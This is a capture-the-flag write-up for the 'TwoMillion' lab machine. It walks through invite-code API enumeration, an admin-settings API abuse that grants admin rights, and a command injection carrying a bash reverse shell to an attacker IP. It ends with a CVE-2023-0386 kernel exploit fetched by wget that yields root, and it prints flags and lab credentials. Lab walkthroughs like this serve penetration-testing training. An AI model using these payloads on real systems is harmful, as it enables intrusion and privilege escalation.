# CTF Writeup: TwoMillion

---

## Reconaissance

An initial nmap scan revealed that only 2 ports are open.

```
nmap -n -Pn -sSCV -p- 10.129.229.66
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 04:21 EDT
Nmap scan report for 10.129.229.66
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.10 seconds
```

From the scan we can retrieve that we couldn't follow to "http://2million.htb/" since there is no dns server which resolves the ip to this name, we will map it to our local dns file "/etc/hosts".


```
sudo echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
```

Since the only attack vector is http, I decided to checkout the website. From the lab description we already know that the endpoint we need to exploit, will be the invitation code functionality. Intercepted the network package in burpsuite and tried sql injections.

Found invitation code site and interesting api file called "inviteapi.min.js" which should be correlated to account creation.
The source code of this script was obfuscated, so I beautifie'd it utilizing DeepSeek.

```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```

The endpoint /api/v1/invite/how/to/generate in the makeInviteCode() function looks interesting, let's try to perform
an curl POST request to it to check the response.

```
curl -X POST 2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

The Output reveals that it is encrypted in ROT13. Decoded it.

```
echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr" | rot13
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```


In order for us getting an invite code 

```
curl -X POST 2million.htb/api/v1/invite/generate       
{"0":200,"success":1,"data":{"code":"UzNCQ0ItUE9JU0UtTkZaWkEtSUlSWlc=","format":"encoded"}}
```

the code is encoded, i'm assuming in base64. Decoded it.

```
echo "UzNCQ0ItUE9JU0UtTkZaWkEtSUlSWlc=" | base64 -d
S3BCB-POISE-NFZZA-IIRZW
```

Created user account with following credentials:

```
root@saitama.de:password

username: saitama
```

Navigated to the access tab and intercepted traffic in proxy (burpsuite) 

Retrieved following endpoint /api/v1/user/vpn/generate, which didn't provide any real value.
Decided to enumerate potential api endpoints on /api/v1

```
curl -s -q 2million.htb/api/v1 -H 'Cookie: PHPSESSID=rvhcqql1mftjrufiqca99406s2' | jq .
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Intercepted the request, when creating a new user.
Since the lab description hinted that it's possible to abuse these API Endpoints in order to create an Administrator user with elevated privs. I'm assuming the last API Endpoint /api/v1/admin/settings/update can be potentially abused. Decided to replace the current intercepted network package with the /admin endpoint and forwarded it, with also modifying the request type itself to PUT.
Also clicked right click on the request itself in BurpSuite and executed "Change request method" in order to gain more parameters, like Content-Type.

```
PUT /api/v1/admin/settings/update HTTP/1.1
```

The response prompted that the content type is invalid. --> Changed it to json.

```
{"status":"danger","message":"Invalid content type."}
```

After changing the Content-Type to application/json, we receive multiple parameters in the response that are being requested, otherwise the server can't response properly. 

As we can see from the following response, it looks like that our user saitama is an admin now.

```
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 06 Oct 2025 12:05:51 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 43

{"id":13,"username":"saitama","is_admin":1}
```

In order to check if our created user account saitama, is now an administrator we will need to curl a request to the endpoint /api/v1/admin/auth.

```
curl -s -q -X GET 2million.htb/api/v1/admin/auth -H 'Cookie: PHPSESSID=rvhcqql1mftjrufiqca99406s2' | jq .
{
  "message": true
}
```

This verified us that we are indeed an administrator now.


## Initial Access


Analyzed the /api/v1/admin/vpn/generate API endpoint. It prompts us with an username parameter, once I added it.
I tried to check if any user can be used, prompted "username":"dwqdqwwqd" and it worked!
Went even further and tested if command injection is possible "username":"dwqdqwwqd$(sleep 2)" and it still worked.
The response took a while, but still got responded properly --> Command Injection is possible.

```
{ 
	"username":"dwdwqwq$(bash -c 'bash -i >& /dev/tcp/10.10.14.53/1337 0>&1')"
}
```

Started up a listener on port 1337 utilizing netcat, before forwarding the package.

```
nc -lvnp 1337
```

Received initial access on the server.

```
nc -lvnp 1337  
listening on [any] 1337 ...
connect to [10.10.14.53] from (UNKNOWN) [10.129.229.66] 58538
bash: cannot set terminal process group (1094): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ 
```

Note that we don't have to URL-Encode our rev shell script within the package, since it is json format.


## Privilege Escalation


Existing users on the server:

```
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash

```

Retrieved admin password in /var/www/html/.env

```
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Logged in as admin and retrieved user.txt in /home/admin

```
de8d7fb95ca39acfb4c53525d0f96b85
```

Since we have a weak shell, let's harden it.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


In order to find out all the files which admin owns and also filtering out system files, we will utilize following command:

```
find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys
/home/admin
/home/admin/.cache
/home/admin/.cache/motd.legal-displayed
/home/admin/.ssh
/home/admin/.profile
/home/admin/.bash_logout
/home/admin/.bashrc
/var/mail/admin
/dev/pts/1
/dev/pts/0
```

Exploring the /var/mail/admin file, gives us a hint that our linux kernel is potentially outdated.

```
admin@2million:/var/mail$ cat admin
cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Linux Kernel Version can be prompted with the following command.

```
admin@2million:/var/mail$ uname -a
uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

Since our linux kernel is from 2022, I searched up for cve's in 2023
git clone'd the following CVE from:

```
https://github.com/puckiestyle/CVE-2023-0386#
```

In order to get the exploit onto the target server, we will need to compress it.


```
tar -cjvf CVE-2023-0386.tar.bz2 CVE-2023-0386
```

Started up a local python server within the directory in which our compressed exploit is.

```
python3 -m http.server 80
```

Requested file from our local python server on target server.

```
admin@2million:~$ wget http://10.10.14.53/CVE-2023-0386.tar.bz2
wget http://10.10.14.53/CVE-2023-0386.tar.bz2
--2025-10-06 13:24:10--  http://10.10.14.53/CVE-2023-0386.tar.bz2
Connecting to 10.10.14.53:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 468748 (458K) [application/x-bzip2]
Saving to: ‘CVE-2023-0386.tar.bz2’

CVE-2023-0386.tar.b 100%[===================>] 457.76K  --.-KB/s    in 0.1s    

2025-10-06 13:24:10 (4.60 MB/s) - ‘CVE-2023-0386.tar.bz2’ saved [468748/468748]
```

Decompressed the tar file.


```
tar -xjvf CVE-2023-0386.tar.bz2
```

Now there is 3 steps in the Exploit to gain root, first one is navigate in the exploit folder and prompt 

```
make all
```

2nd step is to prompt.

```
./fuse ./ovlcap/lower ./gc
```

Now we will need to get a 2nd shell in order to execute the last command. Logged into ssh with credentials
admin:SuperDuperPass123

```
admin@2million:~/CVE-2023-0386$ ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Oct  6 13:27 .
drwxr-xr-x 6 root   root     4096 Oct  6 13:27 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:~/CVE-2023-0386#
```

Gained root and retrieved root.txt in /root directory.

```
b2fab4087e050b7ef31db080475b79f7
```
